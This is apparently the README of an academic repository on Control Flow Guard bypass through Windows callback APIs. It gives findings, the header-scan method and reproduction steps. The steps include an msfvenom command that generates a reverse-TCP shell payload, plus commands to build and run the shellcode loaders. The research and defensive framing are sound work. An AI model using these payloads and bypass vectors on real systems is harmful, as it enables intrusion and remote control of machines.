# cfg-callback-audit

Research data and reproduction materials for the manuscript:

> **Systematic Evaluation of Windows Callback APIs for Control Flow Guard Bypass: A WinSDK Header Audit and Empirical Validation Study**

**Author:** stacraft452  
**Affiliation:** School of Computer Science, Inner Mongolia University, Hohhot, Inner Mongolia, China  
**Contact:** 2227487396@qq.com  
**Target journal:** *Computers & Security* (Elsevier) — under review

---

## Overview

Control Flow Guard (CFG) is a core Windows exploit mitigation, but its enforcement at **callback-based API dispatch sites** has not been systematically measured. This repository supports a study that:

1. Audits MinGW-W64 user-mode headers for callback-related typedefs and API surface
2. Empirically tests seven representative APIs with standardized Metasploit shellcode loaders
3. Reports which dispatch paths bypass CFG and which are explicitly validated

### Key empirical findings (Windows 10 Build 22631, CFG enabled)

| API | CFG outcome |
|-----|-------------|
| `CallWindowProcA` | **Bypass** — arbitrary code execution confirmed |
| `CallNextHookEx` | **Bypass** |
| `EnumWindows` | **Bypass** |
| `TrySubmitThreadpoolCallback` | **Bypass** |
| `SetTimer` | **Blocked** (exit `0xC0000139`) |
| `QueueUserAPC` | **Blocked** |
| `SendMessageCallbackA` | **Partial** — APC queued, not dispatched |

Full details: `data/empirical_results.csv` and manuscript Table 6.

---

## Repository layout

```
cfg-callback-audit/
├── README.md
├── data/
│   ├── empirical_results.csv              # 7 APIs — empirical CFG test outcomes
│   ├── callback_audit_high_priority.csv     # 33 APIs — predicted enforcement (Appendix B)
│   ├── callback_audit_full_catalog.csv      # 157 entries — MinGW header scan catalog
│   ├── mingw_header_scan_raw.txt            # Raw scan log (headers, line numbers, signatures)
│   └── README.md                            # Per-file column descriptions
└── supplementary/
    ├── README.txt
    ├── loader_callwindowproc.cpp
    ├── loader_callnexthook.cpp
    ├── loader_enumwindows.cpp
    └── loader_threadpool.cpp
```

---

## Data provenance

| File | Description | Manuscript reference |
|------|-------------|---------------------|
| `empirical_results.csv` | Standardized CFG test outcomes for 7 APIs | Table 6 |
| `callback_audit_high_priority.csv` | 33 high-priority APIs with predicted category A/B/C | Appendix B |
| `callback_audit_full_catalog.csv` | Structured MinGW header scan output (157 rows) | Methodology §3.1 |
| `mingw_header_scan_raw.txt` | Human-readable raw scan log | Methodology §3.1 |

### Relationship between datasets

- **Full catalog (`157 entries`):** Automated regex scan of **62 user-mode API headers** from MinGW-W64 (WinLibs MCF UCRT, scanned 2026-06-09). Each row is a callback-related typedef or selected API declaration with header file, line number, and signature.
- **High-priority subset (`33 APIs`):** Manually curated from the audit for empirical follow-up; includes predicted CFG enforcement category.
- **Broader survey in manuscript:** The paper additionally reports aggregate statistics from a wider WinSDK header survey (**1,483 files → 87 callback types → 156 API functions**). That broader survey informed Table 1 category counts; the machine-readable export in this repository is the **reproducible MinGW scan** documented in `mingw_header_scan_raw.txt`.

Both levels of data are provided for transparency. Researchers replicating the study should start from the raw scan log and empirical loaders in this repository.

---

## Header scan methodology

Scan date: **2026-06-09**  
Toolchain: **g++ x86_64-posix-seh-rev0 (WinLibs MCF UCRT)**  
Target: **62 user-mode headers** under MinGW-W64 `include/` (user32, winbase, winnt, commctrl, etc.)

Regex patterns (documented in `mingw_header_scan_raw.txt`):

```
P1: typedef <ret> (CALLBACK *<NAME>)(
P2: typedef <ret> (WINAPI *<NAME>)(
P3: typedef <ret> (NTAPI *<NAME>)(
```

Kernel-mode DDK headers (`ddk/`) use a different format and are **excluded** — this study focuses on user-mode CFG bypass surface.

Output columns in `callback_audit_full_catalog.csv`:

| Column | Meaning |
|--------|---------|
| `Header` | Source header file (e.g. `winuser.h`) |
| `Line` | Line number in header |
| `Category` | `TYPEDEF_CALLBACK`, `TYPEDEF_WINAPI`, `TYPEDEF_NTAPI`, or `API_DECL` |
| `Identifier` | Typedef or function name |
| `Signature` | Matched declaration text |

---

## Reproduce empirical tests

### Requirements

- Windows 10/11 **x64**, CFG enabled (Windows Defender Exploit Guard default)
- MinGW-W64 `g++` or MSVC (loaders tested with MinGW-W64 GCC 15.x)
- Metasploit Framework (`msfvenom`) for shellcode generation
- **Isolated laboratory VM** — do not run against production systems

### Steps

```bash
# 1. Generate shellcode (listener on same host for lab test)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f raw -o tcp_windows_amd64.bin

# 2. Build a loader (example: CallWindowProcA)
g++ -o loader.exe loader_callwindowproc.cpp -luser32 -lkernel32

# 3. Run in isolated environment
./loader.exe
```

Repeat with `loader_callnexthook.cpp`, `loader_enumwindows.cpp`, `loader_threadpool.cpp` for other vectors.  
Expected outcomes match `data/empirical_results.csv`.

### Test environment (manuscript)

| Setting | Value |
|---------|-------|
| OS | Windows 10 Pro, Build **22631** (22H2) |
| Architecture | x86-64 (AMD64) |
| CFG | Enabled system-wide |
| Shellcode | Metasploit `windows/x64/shell_reverse_tcp`, 1,388 bytes |
| Compiler | MinGW-W64 GCC 15.1.0 |

---

## Ethics and responsible use

This repository is released **solely** to:

- Reproduce and verify academic research findings
- Support defensive hardening and EDR detection research

**Prohibited uses:** unauthorized access, malware development, or testing on systems you do not own or lack written permission to test.

The author supports coordinated disclosure to platform vendors. PoC loaders invoke standard Metasploit reverse-TCP shellcode in controlled lab conditions only.

---

## Known limitations

- Only **7 of 33** high-priority APIs were empirically tested; remaining entries are **predicted** categories
- Empirical tests on **one Windows build** (22631); other versions may differ
- Header scan covers **62 targeted user-mode headers**, not the full 1,483-file survey
- Loaders require **RWX allocation** (`VirtualAlloc`); combined mitigations (ACG/HVCI) not evaluated here

---

## License

| Component | License |
|-----------|---------|
| `data/*.csv`, `data/*.txt` | [CC-BY 4.0](https://creativecommons.org/licenses/by/4.0/) |
| `supplementary/*.cpp` | [MIT License](https://opensource.org/licenses/MIT) |

---

## Citation

If you use this repository, please cite the parent article (DOI to be assigned upon publication).

**Temporary repository citation (until DOI is available):**

```bibtex
@misc{han2026cfgcallbackaudit,
  author       = {stacraft452},
  title        = {CFG Callback API Audit Dataset and Reproduction Materials},
  year         = {2026},
  publisher    = {GitHub},
  howpublished = {\url{https://github.com/stacraft452/cfg-callback-audit}}
}
```

---

## Changelog

| Date | Change |
|------|--------|
| 2026-06-09 | Initial release: empirical results, high-priority catalog, full MinGW scan, PoC loaders |

---

## Contact

Questions about the dataset or reproduction: **2227487396@qq.com** (stacraft452)
